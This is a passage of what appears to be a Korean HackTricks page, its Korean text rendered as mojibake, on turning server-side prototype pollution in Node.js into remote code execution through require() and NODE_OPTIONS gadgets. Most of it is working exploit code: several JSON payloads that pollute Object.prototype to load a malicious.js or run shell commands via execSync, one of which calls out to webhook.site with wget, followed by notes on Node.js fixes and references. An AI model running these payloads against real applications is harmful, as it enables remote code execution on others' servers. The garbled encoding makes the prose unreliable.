```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### ìƒëŒ€ì ì¸ require - 1

**ì ˆëŒ€ ê²½ë¡œ** ëŒ€ì‹  **ìƒëŒ€ ê²½ë¡œ**ê°€ ë¡œë“œë˜ë©´, ë…¸ë“œê°€ **ë‹¤ë¥¸ ê²½ë¡œë¥¼ ë¡œë“œ**í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### ìƒëŒ€ì ì¸ require - 2

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### ìƒëŒ€ì ì¸ require - 3

ì´ì „ê³¼ ìœ ì‚¬í•˜ê²Œ, ì´ê²ƒì€ [**ì´ writeup**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs)ì—ì„œ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## VM ê°€ì ¯

ë…¼ë¬¸ [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)ì—ì„œëŠ” **`vm`** ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ ì¼ë¶€ ë©”ì„œë“œì—ì„œ **`contextExtensions`**ì˜ ì œì–´ê°€ ê°€ì ¯ìœ¼ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆë‹¤ê³  ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì´ì „ì˜ **`child_process`** ë©”ì„œë“œì™€ ë§ˆì°¬ê°€ì§€ë¡œ ìµœì‹  ë²„ì „ì—ì„œ **ìˆ˜ì •**ë˜ì—ˆìŠµë‹ˆë‹¤.

## ìˆ˜ì • ì‚¬í•­ ë° ì˜ˆê¸°ì¹˜ ì•Šì€ ë³´í˜¸ ê¸°ëŠ¥

í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì€ ê°ì²´ì˜ **ì†ì„±**ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ê²½ìš° í•´ë‹¹ **ì†ì„±**ì´ **ì •ì˜ë˜ì§€ ì•Šì€** ê²½ìš°ì—ë§Œ ì‘ë™í•©ë‹ˆë‹¤. ì½”ë“œì—ì„œ í•´ë‹¹ **ì†ì„±**ì— **ê°’**ì´ **ì„¤ì •**ëœ ê²½ìš°ì—ëŠ” ë” ì´ìƒ ë®ì–´ì“¸ ìˆ˜ ì—†ìŠµë‹ˆë‹¤.

2022ë…„ 6ì›” [**ì´ ì»¤ë°‹**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a)ì—ì„œ `options` ë³€ìˆ˜ëŠ” ë¹ˆ ê°ì²´ `{}` ëŒ€ì‹  **`kEmptyObject`**ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì´ **`options`**ì˜ **ì†ì„±**ì— ì˜í–¥ì„ ë¯¸ì¹˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤.\
ìµœì†Œí•œ v18.4.0ë¶€í„° ì´ ë³´í˜¸ ê¸°ëŠ¥ì´ **êµ¬í˜„**ë˜ì—ˆìœ¼ë©°, ë”°ë¼ì„œ `spawn` ë° `spawnSync` ë©”ì„œë“œì— ì˜í–¥ì„ ì£¼ëŠ” **exploit**ì€ ë” ì´ìƒ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤ (ì˜µì…˜ì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°)!

[**ì´ ì»¤ë°‹**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9)ì—ì„œ vm ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ **`contextExtensions`**ì˜ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ë„ **`{}` ëŒ€ì‹  `kEmptyObject`**ë¡œ ì„¤ì •í•˜ì—¬ ì¼ë¶€ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.

### **ë‹¤ë¥¸ ê°€ì ¯**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)

## ì°¸ê³  ìë£Œ

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ìì‹ ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
